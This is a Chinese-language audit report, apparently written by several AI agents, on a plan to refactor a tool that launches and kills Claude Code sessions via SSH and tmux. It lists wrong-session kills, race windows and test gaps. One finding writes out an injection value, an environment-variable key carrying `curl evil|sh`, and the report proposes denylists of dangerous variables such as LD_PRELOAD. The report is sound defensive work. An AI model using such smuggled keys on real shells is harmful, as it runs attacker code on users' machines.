# MASTERPLAN-v2 四视角审计结论（full-audit + code-picture/LSP）

四个独立 agent：架构合理性(a23f68cf) / 计划↔代码事实核对(a488f0f3) / 波及面(a253a659) / 边界安全(ac147d0c，含 tmux 3.6 真机实测)。
主线程交叉对比结论如下。**MASTERPLAN-v2 不可直接执行**，须按本文件修正为 v3。

---

## 零、审计意外产出：一个**今天就存在**的生产 bug（P0，与重构无关）

**tmux `-t <name>` 是前缀/glob 匹配，不是精确匹配。**

实测（tmux 3.6，隔离 `-L` socket）：只有 `cc-abc12345-2` 存在时，
- `tmux kill-session -t cc-abc12345` → **杀掉了 `cc-abc12345-2`，rc=0**（当成功回报）
- `tmux send-keys -t cc-abc12345 '/exit' Enter` → `/exit` 投进了 `cc-abc12345-2`，rc=0
- `-t '=cc-abc12345'`（加 `=`）→ 正确报 `can't find session`，rc=1 ← **修法**

**本仓必然踩**：`pickFreshTmuxName`(`remote-launch.ts:197`) 刻意造 `cc-<sid8>-2/-3`；cct 造 `<dir>_cc-2/-3`。

**失败场景**：`restartWithAccount` 第④步向 `live.name`（上一次快照）发 `Escape`+`/exit`。若该会话已自然结束 → 前缀命中 `cc-<sid8>-2` → **把 `/exit` 敲进另一个还活着的 claude**；④c 的 kill 再把它销毁，输出为空 → 判定成功 → ⑤ 新建 + `recordLastAccount`。**净结果：无关会话被静默销毁 + pin 写错**，而 UI 报告"已重启"。

另：`isValidTmuxName`(`remote-launch.ts:268`) **允许 `*` 和 `?`** → 用户可经「开新 Claude」建出名字带 glob 的会话（`kill-session -t 'a*a'` 实测会杀掉 `alpha`）。今天靠 `is_ccm_tmux_name` 的字符集顺带挡住，D6 若删掉名字校验这层保护就没了。

→ **P0：所有 `-t` 位置一律 `=` 精确前缀**（注意：`=` 要落在 posixQuote 引号**内**；`new-session -s <name>` 是名字不是 target，**不能**加 `=`）。影响 `tmux.rs:121/153/181`、`session-backend.ts:71/83-84/91/95`。

---

## 一、四方独立收敛的结论（可信度最高，必改）

### C1. 修饰器链表达不了 rbind 的包裹（agent1 B1 / agent3 B1 / agent4 I3，三方独立）
`PayloadModifier{fragment: string}` 只能**追加**，而 rbind 要 `( __ccm_rbind; exec <launcher> --resume <sid> )` —— **闭括号无槽位可发**。
且 **exec 不能去掉**：wrapper 用 `cpid=$BASHPID` 读 `sessions/$cpid.json`(`ccm-wrapper.sh:10-13`)，不 exec 则 claude 是子进程、PID 对不上，通道B 直接失效。
同病灶在 cwd：direct 路的 `cd '<cwd>' && <payload>` 是**守卫式连接**不是前缀——扁平模型下任何排在它之后的 `;` 结尾片段会把它降级成 `cd '/x' && unset A; claude`，**cd 失败时 claude 照样在错目录起来**。

**修法（采纳）**：结构化 IR + 按 backend 渲染 + wrap 装饰器
```
LaunchPlan { env: Record<string,string>, unsetEnv: string[], cwd: string|null,
             argv: string[], wrap: "rbind"|null }
```
修饰器类型从 `fragment: string` 改成 `wrap: (inner: string) => string`，order = **嵌套深度**。这同时表达前缀与包裹，并把「rbind 必须与 exec 同一子 shell」变成**结构保证**而非 order 数字约定。tmux 渲染器把 cwd 交给 `-c`、direct 渲染器渲成中段 `cd && `（字节序可完全复刻今天）。

### C2. D4 会注入**不可选**账号，制造它自己要修的"丢登录"（agent1 B4 / agent4 B3 / agent2 补充）
- `effectiveDefault`(`accounts.ts:103-110`) **不过 `isSelectable`**（`alignableCurrentAccount:155` 的存在理由正是这条）。注入 `loggedIn=false` 的号 → **裸 claude 起来直接要求重新登录**，命中的正是 D4 的目标态②。`exists=false` → CC 在不存在目录建空 config，登录/历史/信任/MCP 全丢。`mode="in-place"` → configDir **就等于共享库 `~/.claude`**（vendor `lib.sh:216`），注入等于没注入却声称已注入。
- **事实核对**：「default 从不注入」**只对一个入口成立**（`remote-section.ts:861` 开新 Claude 弹框）。7 个调用点里 **5 个已经通过 `follow`→`resolveFollowAccount`→`currentWorkingAccount` 在注入**。
- **计划全文没有 `useBase`**——那是为修 issue #75 加的"老会话住基座"逃生口（`tabs.ts:2013/2081/2095`），一律注入会把 #75 打回来。
- **新增风险**：D4 后每条路径都过 `buildEnvPrefix`，而它对非法 dir **throw**。一个含 `!`/`*`/`(`/`)` 的账号目录 → **该远端所有启动路径全 brick**（含用户没要求带账号的）。

**修法**：注入源改 `alignableCurrentAccount`（过 isSelectable）；保留 `useBase`；只改 `remote-section.ts:861` 一个入口；解析层一次性校验 + **降级 account=null + 单次告警**，不把 throw 留在每条路径。

### C3. D6 三重问题（agent1 B5 / agent2 #3 / agent3 B3 / agent4 B2·I8）
① **丢字符集防线**：`is_ccm_tmux_name` 今天干**两件事**——身份白名单 + 字符集(`[A-Za-z0-9_-]`、禁前导 `-`、顺带禁 glob)。而 `parse_tmux_ls` **只校验 sid 列、不校验 name 列**。整体替换 → `kill-session -t <任意名>` 只剩 shell_quote。
② **爆炸半径扩大**：`@ccm_sid` 是 wrapper 在**任何 tmux** 里都设的（`ccm-wrapper.sh:24`，session 级无 `-t`）。用户自建的多窗口 `proj_cc`（window0=claude、window1=未存盘 vim、window2=dev server）只要跑过一次 claude 就带 @ccm_sid → 新守卫**放行 `kill-session`，三个窗口一起端掉**。名前缀挡的是**归属**（谁建的，恒 1 window），不是身份。
③ **老会话反而不可杀**：无 @ccm_sid 的会话（cwd 回退命中的）改后无 sid 可核 → 一律被拒，从"能杀"退化成"不能杀"。

**修法**：拆成三道独立门——
- `is_safe_tmux_target`（字符集/无 glob/无前导 `-`）**永远强制**；
- 身份 = `@ccm_sid 命中 **OR** cc-* 名`（并集，不是替换）；
- 破坏性动作额外要求 `session_windows == 1`（`TmuxSession.windows` 已解析、今天未被任何安全判断消费 = 免费护栏），非本工具名则用 `kill-pane`/`kill-window` 而非 `kill-session`。

### C4. TOCTOU 只在"单条原子远端命令"时才算修（agent1 S5 / agent3 B4 / agent4 I8）
今天 kill 每条命令一次全新连接。若实现成"先查后杀"两次 exec，是**新增**窗口不是消除。
必须钉死单条：`[ "$(tmux show-options -qv -t '=X' @ccm_sid)" = "<sid>" ] && tmux kill-session -t '=X'`。
**且必须对"未设置"fail-closed**：实测 option 未设时 `show-options -v` 输出 `invalid option` 到 **stderr** 且 rc=1（不是空串）→ 不能 `2>&1` 后宽松比对、不能忽略 rc。

### C5. rbind 会 clobber F03.4甲′ 的稳定标题（agent2 #4 / agent3 B5）
`ccm-wrapper.sh:7-8` 设 `set-titles-string "#T"`；`session-backend.ts:82-85` 设 `ccm-rbind-#{@ccm_sid}`。今天二者**永不共存**；U1 后 create 分支先设稳定标题、随后 send-keys 打进去的 rbind **立刻改回 `#T`** → #74/#41 的修复回归。

### C6. D3 前提不实（**四方全部指出**）
`accountColorsActive` 今天**只有一个消费者**（`account-chip.ts:109` chip 头像）。tab 徽章走 `shouldShowAccountBadge`+`detectAccountMismatch`，且 `tabs.ts:1037-1045` 有显式注释「U8 休眠**不作用于这里**（D 审计阻塞项）……颜色可以睡，信息和操作不能睡」。
→ 拆谓词的**结论仍对**，但动作是**新增** `isEnabled`，**绝不能**把 ≥2 门恢复到徽章上（那是被前一轮审计判为阻塞的回归）。
→ 且今天实际有**三个**门：`state.available`(徽章，判据=daemon 支持账号查询)、`deriveUi().kind`(chip 文案)、`accountColorsActive`(chip 头像)。

### C7. `"exec claude"` needle 会被 D9 打破（四方指出）
`sftp.rs:741-748` 现有 needle 含 `"exec claude"`，D9 改 `${CCM_LAUNCHER:-claude}` → **当场红**。计划只写"要加 needle"，没写"有一条现存的会被打破"。

---

## 二、agent4 独有的致命发现（真机实测）

### D1. rbind 门控的**前提本身是错的**（Top风险2 是幻影）
实测：`bash -c '( __ccm_rbind_missing; exec ... )'` → 打一行 command-not-found 到 stderr，**继续执行，rc=0**。`bash -ic` 同。
计划的"否则会话立死"是从旧版 UNIFIED-PLAN 的 `ccm --resume X` 形态（那个**确实**致命）误搬过来的，对 `( __ccm_rbind; exec <launcher> )` 结构**不成立**。
→ 这道"硬门"唯一的真实效果是**误判时静默关掉 @ccm_sid 回填**，把一行无害 stderr 换成根因1 永久复发。

### D2. 门控**没有真相源**，且探针探错了东西
`check_remote_acct_iso`(`acct_iso_deploy.rs:87`) 探的是 `command -v cc-acct-iso`（**账号隔离 CLI**）；wrapper 是**另一个东西**，由 `install_remote_ccm_helper`(`sftp.rs:669`) 写进远端 bashrc。**两个独立安装器，任一可单独存在** → 拿前者门控后者是范畴错误。全仓无 `check_remote_ccm_helper` 探针、无持久化"已装"标志。且远端 shell 是 zsh/fish 时 `.bashrc` 根本不被 source。

**修法（实测验证可行）**：去掉编译期门控，payload 用**运行时自适应**：
```
( command -v __ccm_rbind >/dev/null 2>&1 && __ccm_rbind; exec <launcher> [--resume <sid>] )
```
实测：bash 下 `command -v <函数名>` 打印裸函数名、rc=0；未定义时无输出、rc=1；`A && B; C` 中 C 恒执行。→ 装了=门控通过，没装=逐字节退化成今天的裸 launcher。零 SSH 往返、零缓存、天然 fail-open。

### D3. **rbind 会被 sanitize 吃掉**（agent3 B2 同报）
`sanitizeRemoteLauncher`(`remote-launch.ts:52`) denylist = `[;|&$\`<>\r\n]`，而 `( __ccm_rbind; exec claude )` **含 `;`**。wrap 若发生在 sanitize **之前** → fail-closed 退回裸 `claude` → **rbind 静默不生效、@ccm_sid 永不写 → U1 表面全绿、真机全废**。
→ 必须钉死：**sanitize 只作用于用户提供的 launcher 串，wrap 必须在其后**。

### D4. `exec <launcher>` 与"launcher 可配"互斥（agent1 B3 同报）
`exec` 只能 exec **外部命令**，展开不了别名/函数。而 `cc` 在 Linux 上**是 C 编译器** → `exec cc --resume <sid>` 起一个 cc 然后报错退出，用户看到"终端一闪就没了"、tmux 留空壳。
`remote-launch.ts:15-18` 明写 launcher"刻意不 quote（要被交互 shell 解释——别名/函数/带参）"，与 exec 直接冲突。
→ 必须显式设计：wrapper 提供 `__ccm_exec` 间接层，或规定函数型 launcher 走另一条路。

### D5. `createRunAttach` 幂等短路 = D2 漏掉的第三上下文
`tmux new-session -d -s X 2>/dev/null && … && send-keys '<payload>'; tmux attach -t X` —— X 已存在 → new-session 失败 → **`&&` 短路 → 带账号前缀的 payload 一个字都没被键入**，直接 attach 到跑着旧账号的会话，**无任何报错**。
可达路径：`runNewSessionRemote` 的 tmux 名由 **cwd** 派生（`deriveTmuxName`→`cc-<basename>`，不带 sid）→ 同目录第二次"起新会话"**必然短路**。配合 D4，"我换了默认账号再开一个新会话"**静默给你旧账号**。
restart 第⑤步同理：若④c 的 kill 因 P0 打到兄弟会话，原名仍在 → ⑤ 短路成只 attach → 照样弹"已用新账号重启"并写 pin。

### D6. 双通道 @ccm_sid 有 2–5s"声称≠事实"窗口，计划无仲裁规则
通道A 写**意图** sid（create 时），通道B 写**事实** sid（CC 初始化 1–3s + 轮询 1s）。窗口内：
- `--resume` 失败时 tmux 永久保留 `@ccm_sid=<目标>` 而里面没有 claude → 以 @ccm_sid 为准的破坏性动作认为目标活着而放行 kill。
- `/branch` 分叉时通道A 说 S1、pane 实际跑 S2 → 该窗口内对 S1 发起重启会**杀掉正在跑 S2 的 tmux**。
**修法**：A 写 `@ccm_sid_expect`，B 独占 `@ccm_sid`；破坏性动作只认 `@ccm_sid`（事实），`findIdleTmux` 回退认 `_expect`。

### D7. `extraEnv` 的 **key 无任何校验 = 直接注入点**
`export ${k}=${posixQuote(v)}` —— value 有引号保护，**key 无法被引号保护**。`k = "X=1; curl evil|sh #"` 原样拼进 payload。且 extraEnv 可覆盖 `CLAUDE_CONFIG_DIR`（绕过 `isValidConfigDir` 唯一白名单）、`PATH`、`BASH_ENV`、`LD_PRELOAD`、`SHELLOPTS`。
**修法**：key 白名单 `^[A-Za-z_][A-Za-z0-9_]{0,63}$` + denylist（CLAUDE_CONFIG_DIR ∪ nestedEnvVars ∪ PATH/BASH_ENV/ENV/LD_PRELOAD/SHELLOPTS/IFS）；value 在 build 层预拒 `"` 与控制字符（`launch.rs:91` 对整条 remote_cmd 拒双引号，否则错误信息指不到具体字段）。

### D8. envReset 的 order 会把"结构性互斥"变成"静默丢账号"
今天 `const envReset = configDir ? "" : "unset …"`(`remote-launch.ts:186`) 是**结构性互斥**。拆成两个独立 `applies()` 后，一旦同真 → `export CLAUDE_CONFIG_DIR='X'; unset CLAUDE_CONFIG_DIR; claude --resume S` → **账号被静默抹掉、在基座 resume → 该 sid 不存在 → 会话起不来**。
**免费修法**：envReset 排到 accountPrefix **之前**（5 vs 10），"两个都触发"退化成"正确但冗余"而非"静默错误"；再加链级不变量测试。

### D9. 新会话 @ccm_sid 空窗期的误导文案
`new` 路径连通道A 都没有。空窗期内 `findClaudeTmux` 只在**整表无 sid** 时才回退 cwd → 机器上只要有任何一个带标记的会话，刚起的新会话就不可见 → restart/⇄/kill 全说"该会话不在（本工具的）tmux 里"。几秒后自愈，但把"还没就绪"误导成"不是本工具的会话"。

---

## 三、范围缺口（"统一整个软件"覆盖不到）

1. **本地会话族（Rust 侧另一套 builder）**：`history.rs:922 build_resume_ps_command` / `:965 build_new_session_ps_command`（PowerShell、`cc` 别名优先→回退 claude、**零 CLAUDE_CONFIG_DIR、零 @ccm_sid、零 tmux**）。由 `tabs.ts:2020`、`history.ts:1515/1542`、`session-viewer.ts:355` 在**同一个 Resume 按钮的 else 分支**调用。LaunchSpec 无 local/remote 维度。
2. **第 5/6/7 个 builder**：`buildAttachCmd:278`（tabs.ts 5 处调用）、`buildOpenTerminalCmd:254`（`sftp/panel.ts:542` 绕开全部 executor；D4 后用户从这里开的终端敲 claude **仍落基座、仍丢登录**，与 D4 目标自相矛盾）、部署向导 `buildAcctIsoCmd`（含 `cc-acct-iso run <名>` = 起带账号的 claude，自带一份 `sq()`/校验）。
3. **两个 tmux 名校验器接受集冲突**：`isValidTmuxName` 允许空格（测试 `remote-launch.test.ts:353` 锁了 `'my sess'`）、`is_ccm_tmux_name` 拒空格 → **今天用「开新 Claude」起的自定义名会话永远无法被 kill/send-keys**（既有缺陷）。
4. **`remote-section.ts:861/710/164`** 三处调用点计划全文未提。

---

## 四、依赖前提（不是代码改动，但必须验证）

### P1. D4 的 daemon 可见性前置（agent3）
注入账号 configDir 后 CC 写 `<账号目录>/projects/*.jsonl`，而 daemon 只 watch **一个** claude_dir（`main.rs:334`、`watcher.rs:101/119`）。**只因为 cc-acct-iso 把 `projects/`+`sessions/` 列进 SHARE_SET（symlink 回共享库）daemon 才看得见**。若用户自定义 `ISOLATE_SET` 含它们、或 `SHARED_STORE ≠ $HOME/.claude` → **D4 一开，所有会话对 daemon 隐形**（无 live tab、无流）。三态矩阵必须加这一行 + 真机验。

### P2. D7 可能是纯 no-op（agent3）
默认布局下 `$CLAUDE_CONFIG_DIR/sessions/$cpid.json` 与 `$HOME/.claude/sessions/$cpid.json` 是**同一 inode**（sessions 被 symlink）。→ D7 只在 `SHARED_STORE ≠ $HOME/.claude` 或 sessions 被隔离时才起作用。
**动 4 处 lockstep 之前，先真机确认「根因2」到底是不是它**，否则花掉预算没修到任何东西。

### P3. daemon 零改成立（agent3 逐条判定）
`TMUX_LS_FMT` 有**编译期+测试期双守卫**(`tmux.rs:370-387` include_str! 比对 daemon 源)，本次**不需要加列**（@ccm_sid 已是第 6 列）。D5/D6/D7/D8/D9 **daemon 侧全部零改**。

---

## 五、测试与 e2e（必须写进验收）

1. **黄金串缺口**（最危险的先）：
   - `buildResumeIntoExistingTmuxCmd` **带 configDir 无逐字节黄金串**（只有 `includes` 断言）——正是 D2 那条"易错、必须写进契约"的非对称路径；且该路径 launcher 净化从未被测。
   - `(cwd非空 × configDir有)` 在**所有 builder 零覆盖**。
   - `buildOpenTerminalCmd`/`buildAttachCmd` × configDir 组合矩阵缺失。
2. **黄金串原理上盖不到的新组合**：`(account≠null, resetStaleEnv=true)` 与 `(account=null, resetStaleEnv=false)` 今天**不存在** → 零参考基线，必须用新写的**语义断言**覆盖（见 D8）。
3. **by-design 会红、必须显式 re-baseline**：`session-backend.test.ts:92`（无 ccmSid → 不插 set-option，正面钉住"零回归"）、`remote-launch.test.ts:324/334/352/418`（buildLauncherCmd 4 条）。计划把黄金串定成"唯一等价保证"却没说哪几条要 re-baseline → 会撞上"红了是 bug 还是预期"的判断真空。
4. **e2e 编译期断**：`e2e/resume-cmd-driver.ts` 直接 import 4 builder 的**位置参数签名** → 换 `buildLaunch(spec)` 后 resume-suite(~20 断言)+resume-daemon-frames 全废；`restart-cmd-driver.ts` 同理(~24 断言)。→ **U0 验收条件：薄适配器必须保持位置参数签名**。
5. **e2e 对 D6 会假绿**：`e2e/restart-shims/core.mjs:53` 的 `["send-keys","-t",target,keys]` 不会复现 verify-then-act 融合命令。
6. **F2′ 连带风险**：`restart-cmd-driver.ts` import `detectAccountMismatch`/`accountConfigDir`，F2′ 若顺手删会当场断。
7. **会红清单（估算）**：`tabs.vitest.ts` 21 处 `toHaveBeenCalledWith`（executor 合一 + D6 加参数）、`account-restart.vitest.ts` 17 处、`accounts.vitest.ts` 23 处、Rust `tmux.rs` 10 test、`sftp.rs` needle 表。
8. **wrapper 守卫是弱守卫**：`ccm_snippet_has_required_elements` 只查要素在不在，**不检测语义漂移**（把 `~/.claude/sessions` 改成 `${CLAUDE_CONFIG_DIR:-…}` 全过）→ D7 要加 `CLAUDE_CONFIG_DIR:-` needle。前端侧**零守卫**。

---

## 六、计划被肯定的部分

1. 「载荷装配 × 投递」方向对，且与仓库既有范式同源（`session-backend.ts:6-9` 的 agent × backend 两轴）——新增的 environment 是**第三条正交轴**，建议按"agent × backend × environment"表述。
2. 「executor 吃 spec 而非串」缝留对了（即便阶段②形状被更正，它仍是接 `CommandPlan.capabilities` 的唯一入口）。
3. **D2 非对称契约完全正确**且是真 bug 的沉淀，极易在重构中被"统一化"抹平，写进契约是对的。
4. D5 双通道分治正确（虽然门控方案要改）。
5. Top风险1「黄金串是唯一等价保证」判断正确，且正是用它把"cwd 沉进投递层"证伪的。
6. 功能顺序合理；建议把 U6（每账号模型）**提前到 U0 之后当架构验收**跑。

## 七、计划的事实性错误汇总
| # | 计划原文 | 实际 |
|---|---|---|
| E1 | D3「accountColorsActive 被误当两用」 | 只有一个消费者；且今天实际是**三个**独立门 |
| E2 | D4「default 意图从不注入」 | 只对 `remote-section.ts:861` 一个入口成立；5/7 调用点已注入 |
| E3 | Top风险6「阶段② 把同步串变**异步句柄**」 | daemon 契约已冻结(`resolve_query.rs`)：仍返**命令串**+mode+capabilities，daemon 零 handle。按"句柄"设计会留错缝；LaunchSpec 字段应对齐 `ResumeSpec`(`launchCandidates[]` 是数组 + `substitutedFrom` 溯源) |
| E4 | 「4 builder + 6 executor」 | 远端 ≥7 build 函数 + 部署向导 + Rust 本地 2 套；3 条路径绕开全部 executor |
| E5 | D3「isEnabled = manifest enabled 驱动注入」 | 今天注入门是**每账号 isSelectable**，manifest enabled 只是必要条件 |
| E6 | Top风险2「rbind 未部署会话立死，硬前置」 | 实测**不会死**（stderr 一行，rc=0 继续）；门控是幻影风险 |
| E7 | Top风险3「本机 bashrc 是手抄副本」 | 与 shared **当前逐字节相同**且有 BEGIN/END 围栏；应表述为"暂未漂移、改 shared 后才会漂" |
| E8 | Top风险1「动手前把输出全部钉成黄金串」 | 37 个测试已锁死大部分；应改为"**补齐缺口**"而非"从零建立" |
| E9 | D10「复用 strip_profile_block 安全范式」 | 该函数**只认 cc-monitor 自己的围栏**；删用户手写的 `_cc_acct` 需要"删除我们不拥有的块"这一全新能力，风险等级不同 |

## 八、修正后的顺序（v3）

- **P0（独立、先做、与重构无关）**：tmux `-t` 加 `=` 精确前缀 + `is_safe_tmux_target` 禁 glob → 修今天就在杀错会话的生产 bug。
- **P1（先验证再决定）**：真机确认根因2 是否成立（D7 是否 no-op）、D4 的 daemon 可见性前提。
- **U0**：LaunchPlan IR + wrap 装饰器 + 渲染器（薄适配器**保持位置参数签名**保 e2e）；补黄金串缺口；钉死 sanitize/wrap 顺序、envReset 排序、cd 连接不变量。
- **U1**：rbind 运行时自适应（去门控）+ 标题 clobber 处理 + 守卫三道门（safe_target 恒强制 / 身份=@ccm_sid∪cc-* / 破坏性要求 windows==1）+ 单条原子命令 + `@ccm_sid_expect` 仲裁。
- **U2**：AccountResolver（判别联合 `account|base|unavailable`）+ 注入源过 isSelectable + 保留 useBase + 只改 861 那一个入口 + 解析层降级不 throw。
- **U6 提前**：每账号模型当**架构验收**（含 extraEnv key 白名单/denylist）。
- 其余 U3/U4/U5/F2′/F3/F4/F7 顺延；U4 需承认"徽章从不一致信号→身份标识"是**语义反转**并说明不一致信号迁到哪。
